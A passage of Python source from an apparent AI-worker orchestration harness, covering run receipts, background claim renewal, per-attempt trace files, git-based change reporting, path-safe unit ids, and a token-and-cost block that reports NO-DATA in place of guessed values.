def _write_receipt(run_dir, receipts, report, log_path=None):
    """(path, "") or (None, why). E81: the run's own receipt, on disk, at
    RECEIPT_DIRNAME/RECEIPT_FILENAME under `run_dir`.

    NOT A SECOND RECEIPT WRITER. The content is exactly
    receipt_door.receipt_record()'s eight-question machine view (E72.1), the
    same function scripts/accept_delivery.py and the board already read a
    run through; this only serializes it. The one field added is `report`,
    the delivery report main() prints verbatim, so the file stands alone:
    a reader who never saw stdout still reads what ran, which is the whole
    complaint the codex trial recorded ("files changed and nothing that
    says by whom or with what proof").

    Unlike the capsule and the screens beside it, a failure here is NOT
    swallowed. A run that wrote files and cannot leave a receipt has
    nothing to show for itself, and main() turns this `why` into a nonzero
    exit rather than a silent zero."""
    if not run_dir:
        return None, "no run directory: this run never opened one"
    out_dir = os.path.join(run_dir, RECEIPT_DIRNAME)
    path = os.path.join(out_dir, RECEIPT_FILENAME)
    try:
        # run_dir, not the in-memory record: receipt_record reads the Work
        # document, the journal and the capsule from there, so Q5 (repair
        # history) and Q8 (continuity) carry real answers rather than the
        # empty ones a bare dict leaves behind. main() has already written
        # every integration and refusal back to that document by now.
        body = receipt_door.receipt_record(run_dir, receipts, log_path)
        body["report"] = report
        os.makedirs(out_dir, exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(body, fh, indent=1, default=str)
    except (OSError, ValueError, TypeError, KeyError, AttributeError) as exc:
        return None, "%s could not be written: %s" % (path, exc)
    return path, ""


def _print_resume_screen(run_dir, outcome):
    """--continue's own first words (E73.2): the capsule's resume screen
    when this run wrote one, read straight off disk rather than rebuilt (so
    what a person sees is exactly what the engine last checkpointed, never
    a fresh snapshot that could disagree with it); NO-DATA naming the
    outcome when it did not (a run from before E73.1/E73.2 landed, or one
    whose only capsule write ever attempted failed)."""
    path = os.path.join(run_dir, CAPSULE_FILENAME)
    if not os.path.isfile(path):
        print("brother_run: %s: %r recorded no continuity capsule; "
              "resuming from the journal and the stores alone"
              % (NODATA, outcome))
        return
    try:
        with open(path, encoding="utf-8") as fh:
            cap = json.load(fh)
    except (OSError, ValueError) as exc:
        print("brother_run: %s: the continuity capsule for %r could not "
              "be read (%s); resuming from the journal and the stores "
              "alone" % (NODATA, outcome, exc))
        return
    import continuity
    continuity._print_screen(cap)


def run_loop(plan_path, claims_path, cwd, slots):
    """loop_bridge.main(), in-process, worker left at ITS OWN default
    (model_worker.py, since P0.2 landed there). Returns (code, text).

    The adapter directory is decided HERE (never passed in by the caller):
    every test that stands in for this function uses this exact four-argument
    signature, and the same _source_tools_dir() answer main() reads for the
    intent screen is the one loop_bridge is handed, so the bound a person
    sees and the bound the worker gets come from one loaded module.

    E46 IS DELIBERATELY NOT WIRED HERE, and the reason is worth keeping: the
    heartbeat that narrates this wait is started by main() around the WHOLE
    round loop, not by this function around one round. Two reasons, and the
    second one is the one that was learned the hard way. It covers more: the
    silence a person complained about spans every round, and a heartbeat
    scoped to one round goes quiet in the gaps between them. And this
    signature is load-bearing: every test that stands in for run_loop
    declares exactly these four arguments, so giving it two more (even
    optional ones that main() then passes) breaks nine stubs at once. It did,
    and this comment is why it will not again.

    E62: loop_bridge.main() is ONE BLOCKING CALL that claims a batch and
    waits on every worker in it. This is brother_run's own wait on a running
    worker, and until now nothing renewed the claims it is waiting on: a
    unit whose worker outlived claim_store.DEFAULT_TTL_SECONDS had its lease
    expire under it, and the next reconcile read a still-live owner as
    abandoned. A background renewal (claim_store.BackgroundRenewal) now
    guards this exact wait, started right before it and stopped right
    after, renewing every claim this owner holds at half the lease length
    for as long as the call is in flight. A renewal failure stops the
    renewal loop rather than silently retrying, and is folded into this
    round's own text below so it reaches the run log the same way every
    other word loop_bridge says already does (see the round loop's
    log.note(loop_text...) in main())."""
    owner = "brother-run-%d" % os.getpid()
    args = ["--plan", plan_path, "--claims", claims_path, "--cwd", cwd,
            "--owner", owner]
    if slots is not None:
        args += ["--slots", str(slots)]
    tools_dir = _source_tools_dir()
    if tools_dir:
        args += ["--tools", tools_dir]
    # E59, THE ROUND'S OWN EVENT, written BEFORE the round runs rather than
    # after it: a round whose loop_bridge never returns (a hung worker, a
    # killed process) still leaves the record that it was dispatched, which
    # is the one fact a crash otherwise erases. The plan lives in the run
    # directory, so the journal is one dirname away and no caller had to be
    # changed to carry it.
    run_dir = os.path.dirname(os.path.abspath(plan_path))
    journal.append(run_dir, "dispatch.round",
                   parent_ids=journal.previous(run_dir),
                   payload={"slots": slots, "own_tools": bool(tools_dir)})
    _write_capsule(run_dir)
    out, err = io.StringIO(), io.StringIO()
    renewal = claim_store.BackgroundRenewal(claims_path, owner).start()
    try:
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = loop_bridge.main(args)
    finally:
        failures = renewal.stop()
    text = out.getvalue() + err.getvalue()
    if failures:
        # THE ESTATE'S REFUSAL SHAPE, the same one this file's other
        # refusals use: named unit, one line, never silent. This is folded
        # into the round's own text (not printed separately) so it lands in
        # the run log exactly where every other loop_bridge word already
        # does, with no second logging path to keep in sync.
        text += "".join(
            "NO-DATA: claim renewal failed for %s: %s\n"
            % (unit_id or "(store)", why) for unit_id, why in failures)
    return code, text


def _head(cwd):
    proc = subprocess.run(["git", "rev-parse", "HEAD"], cwd=cwd,
                          capture_output=True, text=True, timeout=30)
    return proc.stdout.strip() if proc.returncode == 0 else None


def _changed_files(before, after, cwd):
    """The files the run actually changed, read from git between the canonical
    revisions, never from a worker's account of itself. Empty list when the
    range cannot be read; a report that cannot show what changed says so
    rather than implying nothing changed."""
    if not before or not after or before == after:
        return []
    proc = subprocess.run(["git", "diff", "--name-only", "%s..%s"
                           % (before, after)], cwd=cwd, capture_output=True,
                          text=True, timeout=30)
    if proc.returncode != 0:
        return []
    return [p for p in proc.stdout.splitlines() if p.strip()]


def _read_claims(path):
    if not os.path.isfile(path):
        return {}
    try:
        with open(path, encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, ValueError):
        return {}


def _git_status(cwd):
    """`git status --porcelain` of `cwd`, verbatim; a NO-DATA sentence, never
    a fabricated "clean", when it cannot be read."""
    try:
        proc = subprocess.run(["git", "status", "--porcelain"], cwd=cwd,
                              capture_output=True, text=True, timeout=30)
    except Exception as exc:  # noqa: BLE001
        return "%s: git status could not run in %s: %s" % (NODATA, cwd, exc)
    if proc.returncode != 0:
        return ("%s: git status exited %d in %s: %s"
               % (NODATA, proc.returncode, cwd, (proc.stderr or "").strip()[:200]))
    return proc.stdout if proc.stdout else "(clean)"


def _round_tree_state(cwd, before_head, after_head):
    """T2: the before-and-after tree summary one round's attempt trace
    carries: the two canonical revisions this round ran between, the files
    git says changed across them (reusing _changed_files, the same read the
    delivery report itself uses), and git status --porcelain taken once the
    round is over. Plain text, never raises."""
    changed = _changed_files(before_head, after_head, cwd)
    return "\n".join([
        "revision before this round: %s" % (before_head or NODATA),
        "revision after this round:  %s" % (after_head or NODATA),
        "changed files (%d): %s" % (len(changed),
                                    ", ".join(changed) if changed else "none"),
        "", "git status --porcelain, taken after this round:",
        _git_status(cwd).rstrip() or "(clean)", ""])


def _safe_uid_segment(uid):
    """A unit id turned into one filesystem-safe path segment: no "/", no
    "..", no separator of any kind survives. Unit ids are only ever checked
    for non-empty and uniqueness (door.py, work_record.py), never for path
    characters, and a real id already in use contains a literal "/"
    (token-shield:docs/reconcile-backlog-2026-09-03, see v3_receipts.py), so
    a raw id is never safe to join into a path.

    Mirrors worktree_lane.py's own sanitizer (acquire(), near its line 115:
    `safe = "".join(c if c.isalnum() or c in "-_" else "-" for c in
    str(unit_id))`) rather than inventing a second scheme for the same
    estate. That one-shot worktree name only has to be unique among lanes
    live at once and tolerates a rare collision (git worktree add just
    fails); an attempt-trace directory is written on every round for every
    unit's whole history, so this always appends a short hash of the raw id
    on top, guaranteeing two different ids never share a directory even when
    sanitizing collapses them to the same string (e.g. "a/b" and "a.b" both
    become "a-b"). The id recorded INSIDE the trace files stays the real,
    unsanitized string; only the path segment is touched here."""
    safe = "".join(c if c.isalnum() or c in "-_" else "-"
                   for c in str(uid))[:80] or "unit"
    digest = hashlib.sha256(str(uid).encode("utf-8", "surrogatepass")).hexdigest()[:8]
    return "%s-%s" % (safe, digest)


def _write_attempt_trace(run_dir, uid, attempt, claim, loop_text, tree_state):
    """T2: one unit's one attempt, in its own subdirectory under the run
    directory, never overwritten by a later attempt. claim_store.acquire()
    bumps the attempt number on every reclaim, so attempt N's directory is
    written once, when this round first reports that number, and every later
    round for the SAME unit lands under a NEW attempt-N+1 directory instead
    of touching this one: the exact "beside, never over" shape the done-check
    asks for.

    Three files, each honestly named for what it actually holds, since this
    engine's own rule is never to claim more than a record proves:
      claim.json      the claim store's own record for this attempt: state,
                       worker_id, and, once released, the evidence dict
                       (check_command, exit_code, output, canonical_rev) that
                       integrate.py itself captured re-running the unit's
                       done_check. This is where a failed attempt's real
                       check output survives, in the `output` field.
      engine_output.txt  this round's captured loop_bridge stdout+stderr,
                       verbatim; covers every unit this round claimed, not
                       only this one, since loop_bridge does not split its
                       own output per unit.
      tree_state.txt   the before-and-after revision pair, the changed-files
                       list between them, and a git status taken after the
                       round.

    Best effort: a run's delivery must not fail because its own trace could
    not be written, so an OSError here is reported once and swallowed."""
    attempt_dir = os.path.join(run_dir, ATTEMPTS_DIRNAME,
                               _safe_uid_segment(uid),
                               "attempt-%d" % attempt)
    if os.path.isdir(attempt_dir):
        return  # this attempt was already captured; never overwrite it
    try:
        os.makedirs(attempt_dir)
        with open(os.path.join(attempt_dir, "claim.json"), "w",
                 encoding="utf-8") as fh:
            json.dump(claim, fh, indent=1)
        with open(os.path.join(attempt_dir, "engine_output.txt"), "w",
                 encoding="utf-8") as fh:
            fh.write("brother_run: this round's engine output (loop_bridge "
                     "stdout+stderr), covering every unit claimed this "
                     "round, not only %s\n\n%s"
                     % (uid, loop_text or "(no output captured this round)\n"))
        with open(os.path.join(attempt_dir, "tree_state.txt"), "w",
                 encoding="utf-8") as fh:
            fh.write(tree_state)
        # E59: the journal points AT the trace it just wrote rather than
        # copying any of it; the three files above are where a reader goes
        # for the output, and this is the event that says they exist.
        journal.append(run_dir, "attempt.traced",
                       parent_ids=journal.previous(run_dir), unit_id=uid,
                       payload={"attempt": attempt,
                                "claim_state": str((claim or {}).get("state")
                                                   or NODATA)})
    except OSError as exc:
        print("brother_run: could not write the attempt trace for %s "
              "attempt %d to %s (%s); the run continues without it"
              % (uid, attempt, attempt_dir, exc), file=sys.stderr)


def _merge_usage_sidecar(claims, claims_path):
    """T1 follow-up: fold loop_bridge's per-unit usage sidecar
    (loop_bridge.usage_sidecar_path, written beside claims.json) into
    `claims` so build_cost_block can sum real tokens_in/tokens_out/
    tokens_cached. claim_store.py's own release() carries no "usage" field
    (it is not this task's file to widen), so real usage travels beside the
    claim store instead of inside it; this is the small seam that reads it
    back in before the cost block is built. Merges in place and returns the
    same dict; a unit whose claim already carries a "usage" key (write from
    a caller this file does not control) is left untouched rather than
    overwritten. Never raises: a missing or unreadable sidecar means no
    usage was recorded, which is exactly what an empty claims dict already
    means to build_cost_block."""
    sidecar = loop_bridge.read_usage_sidecar(
        loop_bridge.usage_sidecar_path(claims_path))
    for uid, usage in (sidecar or {}).items():
        claim = claims.get(uid)
        if isinstance(claim, dict) and isinstance(usage, dict) and usage \
                and "usage" not in claim:
            claim["usage"] = usage
    return claims


#: The verdict words the engine uses about a refused unit, and what each one
#: MEANS to the person who asked for the work. The engine's own line is kept
#: beside the plain sentence rather than instead of it: only that line carries
#: the specifics (which undeclared file, which base), and the estate's own
#: acceptance areas 4 and 6 require exactly those specifics to be named on the
#: surface, not buried in a log. A refusal is the user's business.
PLAIN_VERDICTS = (
    ("QUARANTINE", "it changed files it never declared, so the whole unit was "
                   "quarantined and none of it was merged"),
    ("dirty", "the repository being worked on had uncommitted changes, so "
              "nothing could be merged into it"),
    ("NEEDS-REPAIR", "its own check did not pass on the current base, so it "
                     "needed repairing and ran out of attempts"),
    ("NOT CLAIMED", "the scheduler never handed it out this run"),
)


def _reason_for(uid, loop_text):
    """The scheduler's or integrator's own words for this unit, pulled from
    loop_bridge's captured output rather than re-derived, so the report never
    disagrees with the run that actually happened. The LAST line naming this
    unit as its own whitespace-delimited token wins, since that is the most
    final thing said about it (a release line comes after a claim line).

    A line carrying one of the PLAIN_VERDICTS words WINS over a later line
    that does not: measured 2026-08-31 on the estate's own area 4 fixture,
    the last line naming a quarantined unit was the bookkeeping line
    ("U2 failed scope=QUARANTINE integrated=False") while the line that
    actually named the undeclared file sat two lines above it. The specific
    path is the whole value of this sentence to a person."""
    # ponytail: "the longest verdict-carrying line" is a heuristic, and it is
    # the right one here because the bookkeeping echo of a verdict
    # ("U2 failed scope=QUARANTINE integrated=False") is always shorter than
    # the line that states it with its evidence ("QUARANTINE: 1 path(s)
    # changed that U2 never declared: packages/pkg_b/..."). Revisit if the
    # engine ever grows a long line that says less.
    verdicts, fallback = [], ""
    for line in (loop_text or "").splitlines():
        if uid not in line.split():
            continue
        fallback = line.strip()
        if any(word.lower() in line.lower() for word, _s in PLAIN_VERDICTS):
            verdicts.append(line.strip())
    return max(verdicts, key=len) if verdicts else fallback


#: T1: every delivery record names these eight fields, whatever their value.
#: A field is only "absent" when its KEY is missing from the block; NO-DATA
#: (plus a reason) is a present, honest value and is never confused with a
#: missing key by validate_cost_block below.
COST_FIELDS = ("tokens_in", "tokens_out", "tokens_cached",
              "tokens_cache_write", "turns",
              "wall_clock_seconds", "cache_hit_rate", "failure_category",
              "harness_version", "harness_revision")

#: The fixed vocabulary a failure_category may take. "none" when nothing was
#: refused; the rest name the engine's own refusal shapes (PLAIN_VERDICTS,
#: above) at one word of granularity, never a free-text guess.
FAILURE_CATEGORIES = ("none", "check-failed", "scope-violation", "crashed",
                      "timeout")


#: The manifest scripts/bundle_runtime.py writes BESIDE brother_run.py in a
#: packaged copy (bundle/runtime/RUNTIME-MANIFEST.json). A dev checkout has
#: no such file next to scripts/brother_run.py, so this path exists only in
#: an installed plugin, which is exactly the case git cannot answer for.
RUNTIME_MANIFEST = os.path.join(HERE, "RUNTIME-MANIFEST.json")
#: Appended to a value read from that manifest, so a receipt says WHICH
#: source named the engine: a live `git` in a checkout, or the stamp the
#: packager left behind.
MANIFEST_SOURCE_NOTE = " (from the runtime manifest)"


def _manifest_identity(field, manifest_path=None):
    """`field` out of the packaged RUNTIME-MANIFEST.json, or None when there
    is no manifest beside this file, it cannot be read, or the field itself
    is NO-DATA (a bundle generated outside a checkout stamps NO-DATA rather
    than guessing, and a NO-DATA is never upgraded into an answer here)."""
    manifest_path = manifest_path or RUNTIME_MANIFEST
    try:
        with open(manifest_path, encoding="utf-8") as fh:
            doc = json.load(fh)
        value = doc.get(field) if isinstance(doc, dict) else None
    except (OSError, ValueError):
        return None
    if not isinstance(value, str) or not value.strip():
        return None
    value = value.strip()
    return None if value.startswith(NODATA) else value


def _identity_or_manifest(field, nodata):
    """harness-identity-v1 (the zero-context critic on a fresh clone of
    v1.0.0, 2026-09-03): git has already failed, so the packaged stamp is
    the last honest source. Its value, annotated with where it came from, or
    the caller's own NO-DATA sentence unchanged when there is no stamp
    either. The annotation sits AFTER the value so a reader (and
    receipt_door's twelve-hex fragment) still reads the sha first."""
    value = _manifest_identity(field)
    return (value + MANIFEST_SOURCE_NOTE) if value else nodata


def _harness_version(repo=None):
    """`git describe --always --dirty` of the tree that ran this harness
    (REPO_ROOT by default, this tool's own checkout, not the target --cwd):
    the one version string a receipt reader can match back to an exact
    commit, dirty state included. When git cannot answer (not a git
    checkout, git missing, or any other failure), the packaged manifest's
    `source_describe` stamp, named as such; NO-DATA, never a fabricated
    string, when there is no stamp either."""
    repo = repo or REPO_ROOT
    try:
        proc = subprocess.run(["git", "describe", "--always", "--dirty"],
                              cwd=repo, capture_output=True, text=True,
                              timeout=30)
    except Exception as exc:  # noqa: BLE001
        return _identity_or_manifest(
            "source_describe",
            "%s: git describe could not run in %s: %s" % (NODATA, repo, exc))
    if proc.returncode != 0:
        return _identity_or_manifest(
            "source_describe",
            "%s: git describe exited %d in %s: %s"
            % (NODATA, proc.returncode, repo,
               (proc.stderr or "").strip()[:200]))
    out = (proc.stdout or "").strip()
    return out if out else _identity_or_manifest(
        "source_describe",
        "%s: git describe produced no output in %s" % (NODATA, repo))


def _harness_revision(repo=None):
    """`git rev-parse HEAD` of the tree that ran this harness (REPO_ROOT by
    default, this tool's own checkout, not the target --cwd): the exact
    commit sha a receipt reader can match a delivery back to, unlike
    `git describe` (_harness_version, above), which is ambiguous across this
    estate's tag namespaces. NO-DATA, never a fabricated string, when git
    cannot answer (not a git checkout, git missing, or any other failure).
    Deliberately NOT `git describe`: harness-revision-v1 (defect 2, the
    zero-context critic, 2026-09-03) asks for the one string that names the
    exact commit, not the nearest tag.

    AN INSTALLED COPY IS NOT A CHECKOUT (harness-identity-v1, the same
    critic on a fresh clone of v1.0.0): the plugin cache holds no .git at
    all, so git exits 128 there and every installed run's receipt used to
    read "harness NO-DATA". When git cannot answer, the packaged manifest's
    `source_revision` stamp is read instead and the value says so; NO-DATA
    stays for a copy with neither git nor a manifest."""
    repo = repo or REPO_ROOT
    try:
        proc = subprocess.run(["git", "rev-parse", "HEAD"], cwd=repo,
                              capture_output=True, text=True, timeout=30)
    except Exception as exc:  # noqa: BLE001
        return _identity_or_manifest(
            "source_revision",
            "%s: git rev-parse could not run in %s: %s" % (NODATA, repo, exc))
    if proc.returncode != 0:
        return _identity_or_manifest(
            "source_revision",
            "%s: git rev-parse exited %d in %s: %s"
            % (NODATA, proc.returncode, repo,
               (proc.stderr or "").strip()[:200]))
    out = (proc.stdout or "").strip()
    return out if out else _identity_or_manifest(
        "source_revision",
        "%s: git rev-parse produced no output in %s" % (NODATA, repo))


def _failure_category(refused, loop_text):
    """One word from FAILURE_CATEGORIES, read from the engine's own words
    (never invented): "none" when this run refused nothing; otherwise the
    first of timeout, scope-violation, check-failed that a refusal reason or
    the round output actually names, "crashed" as the catch-all for a
    refusal that fits none of the named shapes (a dirty tree, a merge
    conflict, an unavailable model)."""
    if not refused:
        return "none"
    text = (" ".join(reason for _uid, reason in refused) + " "
           + (loop_text or "")).lower()
    if "timed out" in text or "timeout" in text:
        return "timeout"
    if "quarantine" in text:
        return "scope-violation"
    if "needs-repair" in text or "did not pass" in text:
        return "check-failed"
    return "crashed"


def _sum_usage_field(claims, field, gap=None):
    """The sum of `field` out of every claim's own "usage" dict, when at
    least one claim in this run carries one; NO-DATA, never an invented
    zero, when no worker in this run recorded any usage at all. `gap`, when
    given, is the reason in words (see _usage_gap_reason) appended to that
    NO-DATA, so a receipt reader learns WHY nothing was recorded rather
    than only that it was not."""
    found, total = False, 0
    for claim in (claims or {}).values():
        usage = claim.get("usage") if isinstance(claim, dict) else None
        if not isinstance(usage, dict):
            continue
        val = usage.get(field)
        if isinstance(val, (int, float)) and not isinstance(val, bool):
            found, total = True, total + val
    if found:
        return total
    return "%s: no worker in this run recorded %s%s" % (
        NODATA, field, ("; " + gap) if gap else "")


def _usage_gap_reason(spawn):
    """Why a run's token counts can be missing, in the engine's own words,
    read from the ONE module that decides it: the spawn adapter loop_bridge
    loaded. model_worker.py reads the claude CLI's own usage object off
    every --output-format json answer (measured live 2026-09-03: a one word
    reply carried input_tokens, output_tokens, cache_read_input_tokens and
    cache_creation_input_tokens) and forwards it as its result's "cost";
    whether that survives to the claim store's sidecar depends on the
    adapter forwarding it (USAGE_FIELDS, present since the T1 follow-up),
    and an installed adapter older than that drops it silently. `spawn` is
    the loaded adapter module, or None when none could be loaded."""
    if spawn is None:
        return "no worker adapter could be loaded, so no worker ran"
    where = getattr(spawn, "__file__", None) or NODATA
    if not hasattr(spawn, "USAGE_FIELDS"):
        return ("the worker adapter loaded from %s predates the usage "
                "passthrough and drops the token counts model_worker.py "
                "reads from the model's own answer" % where)
    return ("the adapter at %s forwards usage, so the worker's own answer "
            "carried none: a model command whose stdout is not the claude "
            "CLI's --output-format json object (a stub, another CLI) reports "
            "no token counts" % where)


def _worker_time_limit(spawn):
    """(seconds, note): the per-attempt bound the loaded adapter will really
    apply, read from the module that enforces it (bm_worker_spawn's
    DEFAULT_TIMEOUT_SECONDS, the default SpawningWorker is built with by
    loop_bridge.LaneWorker), and a note when that disagrees with
    WORKER_TIME_LIMIT_SECONDS or could not be read. Never a guess: with no
    adapter (None) the constant is printed with a NO-DATA note saying no
    adapter confirmed it, rather than a number nobody measured."""
    value = getattr(spawn, "DEFAULT_TIMEOUT_SECONDS", None)
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        if int(value) == WORKER_TIME_LIMIT_SECONDS:
            return int(value), ""
        return int(value), ("the loaded adapter's own limit, which differs "
                            "from this engine's WORKER_TIME_LIMIT_SECONDS "
                            "of %d" % WORKER_TIME_LIMIT_SECONDS)
    return WORKER_TIME_LIMIT_SECONDS, ("%s: no loaded adapter confirmed this "
                                       "value" % NODATA)


def build_cost_block(claims, refused, loop_text, wall_clock_seconds,
                     harness_version, harness_revision=None, usage_gap=None):
    """The cost block every delivery record carries (T1): tokens in, out and
    cached, turns, wall clock, cache hit rate, a failure category, the
    harness version and the harness revision. Every field named in
    COST_FIELDS is always a key in the result; a value is either the real,
    measured number or a NO-DATA string naming why it could not be measured,
    never a zero standing in for "unknown" and never a made-up figure.

    `turns` is the sum of every claim's own "attempt" count (claim_store
    always sets this on claim, so it is real data, and zero across an empty
    claims.json is a genuine count, not a missing one). `wall_clock_seconds`
    and `harness_version` are passed in already measured, by the caller,
    since only the caller (main()) knows when the run actually started and
    which tree ran it. `harness_revision` (harness-revision-v1, defect 2,
    the zero-context critic, 2026-09-03) is the exact commit sha beside that
    version string; left None (every caller that predates this), it is
    measured here rather than left absent, so an existing caller that never
    learns about the new parameter still gets a real value. `usage_gap` is
    _usage_gap_reason's sentence, appended to every token field that reads
    NO-DATA so the block says why in its own words, never a bare NO-DATA.

    THE RATE IS NEVER PRINTED ABOVE ONE, AND IT IS A REAL SHARE. model_worker
    names the claude CLI's `input_tokens` as tokens_in, and that count
    EXCLUDES cache reads and cache writes (measured live 2026-09-03:
    input_tokens 2 beside cache_read_input_tokens 22972 and
    cache_creation_input_tokens 70272 on a one word reply), so tokens_cached
    over tokens_in is not a share of anything: on a real run it read
    NO-DATA with tokens_cached 1,329,026 against tokens_in 30 (roadmap row
    E92, the t7 overhead gauntlet). model_worker now forwards the
    cache-creation count as tokens_cache_write, so the DENOMINATOR is the
    run's whole input, tokens_in + tokens_cached + tokens_cache_write, and
    the rate is the share of that input the model read from cache. Three
    cases, in this order:

      all three counts real     the share, which cannot exceed one because
                                the numerator is one of the three terms of
                                its own denominator.
      no cache-write count,     the old quotient, kept for the adapters and
      tokens_cached <= in       the recorded fixtures that carry only the
                                three original fields and are already a
                                share on their own terms.
      no cache-write count,     NO-DATA naming the adapter that lacks the
      tokens_cached > in        field (the codex adapter's own wire schema
                                has no cache-creation count), never a
                                zero standing in for it."""
    if harness_revision is None:
        harness_revision = _harness_revision()
    tokens_in = _sum_usage_field(claims, "tokens_in", usage_gap)
    tokens_out = _sum_usage_field(claims, "tokens_out", usage_gap)
    tokens_cached = _sum_usage_field(claims, "tokens_cached", usage_gap)
    tokens_cache_write = _sum_usage_field(claims, "tokens_cache_write",
                                          usage_gap)
    real = [isinstance(v, int) for v in (tokens_in, tokens_cached,
                                        tokens_cache_write)]
    total_input = (tokens_in + tokens_cached + tokens_cache_write
                   if all(real) else 0)
    if all(real) and total_input > 0:
        cache_hit_rate = round(tokens_cached / total_input, 4)
    elif (isinstance(tokens_in, int) and isinstance(tokens_cached, int)
            and tokens_in > 0 and tokens_cached <= tokens_in):
        cache_hit_rate = round(tokens_cached / tokens_in, 4)
    elif isinstance(tokens_in, int) and isinstance(tokens_cached, int):
        cache_hit_rate = ("%s: tokens_cached (%d) exceeds tokens_in (%d) and "
                          "this run recorded no tokens_cache_write; the "
                          "worker's tokens_in counts only uncached input "
                          "tokens (the claude CLI's input_tokens), so the "
                          "cache-creation count a real share needs (the "
                          "codex adapter's wire schema has none) is missing "
                          "and no rate is printed"
                          % (NODATA, tokens_cached, tokens_in))
    else:
        cache_hit_rate = ("%s: cannot compute a cache hit rate without real "
                          "tokens_in and tokens_cached, which this run did "
                          "not record%s" % (NODATA, ("; " + usage_gap)
                                            if usage_gap else ""))
    turns = sum(int(c.get("attempt") or 0) for c in (claims or {}).values()
               if isinstance(c, dict))
    return {"tokens_in": tokens_in, "tokens_out": tokens_out,
           "tokens_cached": tokens_cached,
           "tokens_cache_write": tokens_cache_write, "turns": turns,
           "wall_clock_seconds": wall_clock_seconds,
           "cache_hit_rate": cache_hit_rate,
           "failure_category": _failure_category(refused, loop_text),
           "harness_version": harness_version,
           "harness_revision": harness_revision}


def validate_cost_block(block):
    """(ok, missing_fields). ok is True only when every field in COST_FIELDS
    is a KEY of `block`, whatever its value: a real number and a NO-DATA
    string are both "present". Driven backwards (T1's own done-check): delete
    one key from a good block and this refuses, naming exactly that key."""
    if not isinstance(block, dict):
        return False, list(COST_FIELDS)
    missing = [f for f in COST_FIELDS if f not in block]
    return not missing, missing


#: The lock files env_lock checks, in this fixed order (P9, persona
#: integration plan 2026-09-04 row P9; doc 12.6 code, environment and model
#: identity): the first one found in the target names the environment. Order
#: follows the row's own words verbatim.
ENV_LOCK_FILENAMES = ("requirements.txt", "uv.lock", "poetry.lock",
                      "environment.yml")


def _env_lock(cwd):
    """sha256 hex digest of the first of ENV_LOCK_FILENAMES that exists in
    the target `cwd`, checked in that fixed order; NO-DATA naming that none
    of the four exist when none do, or that no target directory was even
    given. A file that IS found but cannot be read gets its own NO-DATA
    reason, never a swallowed exception standing in for a hash nobody
    computed."""
    if not cwd:
        return "%s: no target directory was given" % NODATA
    for name in ENV_LOCK_FILENAMES:
        path = os.path.join(cwd, name)
        if not os.path.isfile(path):
            continue
        try:
            with open(path, "rb") as fh:
                return hashlib.sha256(fh.read()).hexdigest()
        except OSError as exc:
            return "%s: %s could not be read (%s)" % (NODATA, name, exc)
    return ("%s: none of %s exist in the target"
           % (NODATA, ", ".join(ENV_LOCK_FILENAMES)))


def _data_identity_for_row(row, cwd):
    """{declared path: sha256 hex or its own NO-DATA reason} for every path
    a unit declares under `data_inputs` (P9, doc 12.6), resolved against the
    target `cwd`. NO-DATA naming that the unit declares no data_inputs at
    all when the field is empty or absent, never an empty dict standing in
    for "nothing was asked for". A declared path that does not exist or
    cannot be read gets its own NO-DATA reason, per path, so one bad path
    never hides the hashes of the others."""
    declared = row.get("data_inputs") or []
    if not declared:
        return "%s: this unit declares no data_inputs" % NODATA
    out = {}
    for rel in declared:
        path = rel if os.path.isabs(rel) else os.path.join(cwd or "", rel)
        if not os.path.isfile(path):
            out[rel] = "%s: %s does not exist in the target" % (NODATA, rel)
            continue
        try:
            with open(path, "rb") as fh:
                out[rel] = hashlib.sha256(fh.read()).hexdigest()
        except OSError as exc:
            out[rel] = "%s: %s could not be read (%s)" % (NODATA, rel, exc)
    return out


def build_report(record, claims, before, after, changed=None,
                 log_path=None, loop_text="", cost_block=None, cwd=None,
                 price_block=None):
    """The delivery report: what happened, named, never inferred from a
    worker's own claim. `record` is the canonical Work document door wrote.

    The harsh EVAD 2026-08-31 found this report proved nothing to a skeptic:
    it named units and revisions but never the files that changed nor what
    verified each unit. It now carries a Changed list (from git, `changed`)
    and, per integrated unit, the done_check command that had to pass, so a
    reader can see WHAT moved and HOW it was checked without trusting a
    worker's self-report.

    `cost_block`, when given (T1), is printed one field per line, in
    COST_FIELDS order, so every required field is always readable in
    the same place a person already reads the rest of the record; omitted
    (None) leaves the existing callers of this function, which predate the
    cost block, byte-for-byte unchanged.

    `price_block` (E90) is the same treatment for what this run said it
    would cost BEFORE it ran, printed above the cost so the two readings
    sit together and a reader can see the expectation beside the bill. The
    Delivery Receipt v1 contract allows this: within v1 a field is never
    removed and never renamed, it may only be added, and the receipt's
    `report` key is this report verbatim. Omitted (None), every caller that
    predates E90 gets a byte-for-byte unchanged report.

    `cwd` (P9, persona integration plan 2026-09-04 row P9; doc 12.6 code,
    environment and model identity; doc F14 reproducibility failure): the
    target's own directory, never this tool's checkout, read once here for
    env_lock (_env_lock) and per-row data_identity (_data_identity_for_row)
    and handed to receipt_door.receipts_for so every receipt prints the
    target's revision, its environment lock hash and its declared data
    hashes beside the harness revision it already carried. target_revision
    is simply `after`, already this target's own HEAD read post-integration;
    omitted (None, every caller that predates this row) reads NO-DATA on
    env_lock and data_identity, never a made-up hash."""
    rows = {r["id"]: r for r in record.get("rows", [])}
    integrated, refused = [], []
    for uid in rows:
        held = claims.get(uid)
        row = rows.get(uid) or {}
        # INTEGRATED MEANS THE VERIFIER SAID SO, never the claim store alone.
        # _mark_integrated writes status DONE onto the row only after
        # _verify_evidence passed, and writes integration_refused when it did
        # not. EVAD run 5 trial 2 (uncoached, against public v0.9.10): a
        # do-nothing unit with a vacuous check read delivered at exit 0
        # because this loop trusted state == "done" while the verifier's
        # refusal reached only the on-disk record. The row's stamp is the
        # verdict; a done claim without it is refused, never integrated.
        if row.get("status") == "DONE":
            integrated.append(uid)
            continue
        if held and held.get("state") == "done":
            reason = row.get("integration_refused") or (
                "the claim store says done, but the verifier never marked "
                "this row integrated; a claim without verified evidence is "
                "refused, never stamped")
            refused.append((uid, "the verifier refused what the claim "
                            "asserted: %s" % reason))
            continue
        # PARKED IS NOT THE SAME AS FAILED. A unit held for a person's release
        # decision was never claimed, so the engine has no verdict to quote
        # about it and the generic "the scheduler never handed it out"
        # sentence below would be true and useless. loom.park_reason is the
        # row's own recorded words: the risk class, the words it hit on and,
        # once answered, who decided and what they said.
        parked = loom.park_reason(rows.get(uid) or {})
        if parked:
            refused.append((uid, parked))
            continue
